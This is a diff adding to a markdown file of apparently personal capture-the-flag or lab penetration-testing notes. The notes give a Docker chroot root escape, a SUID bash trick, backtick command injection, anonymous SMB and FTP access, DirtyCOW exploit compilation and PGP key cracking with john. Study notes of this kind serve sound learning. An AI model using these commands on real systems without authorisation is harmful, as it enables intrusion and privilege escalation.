@@ -282,4 +282,61 @@ On host:
 - `sudo chmod +xs /tmp/[name]/bash`
 
 On target:
-- `/tmp/[name]/bash -p`
+- `/tmp/[name]/bash -p`w
+
+## Docker
+
+### HTTP Enum
+
+HTTP trick; look for `robots.txt` on websites.
+
+Read through javascript files on hosts.
+
+If you have code execution through a command and it's a linux machine use backticks (`) to get code execution.
+
+### Escalation
+
+GTFOBins has a docker section with command:
+- `docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh`
+
+## Additional notes
+
+### Machine 1
+
+`sudo -l` can give sudo privileges for commands to only be executed on a single file.
+
+### Machine 2
+
+SMB enumeration (anonymous): 
+- `smbmap -H [ip]`
+- `smbclient -N -L \\\\[ip]`
+- `smbclient \\\\[ip]\\[folder]`
+
+SMB downloading/uploading:
+- `get [file]`
+- `put [file]`
+
+FTP enumeration:
+- `ftp [ip] [port]`
+
+FTP downloading/uploading:
+- `get [file]`
+- `put [file]`
+
+Focus more on all SUID vectors listed.
+
+### Machine 3
+
+Dirtycow: https://github.com/thaddeuspearson/Understanding_DirtyCOW
+
+Compile: `gcc -static exploit.c -o dirtyc0w -lpthread`
+
+PGP files:
+- `gpg --import [file].asc` (key)
+- `gpg --decrypt [file2].pgp`
+
+If this does not work, try cracking `[file].asc`:
+- `gpg2john [file].asc > hash.txt`
+- `john --format=gpg --wordlist=[wordlist] [hash].txt`
+
+Hunt for `.asc` and `.pgp` files?
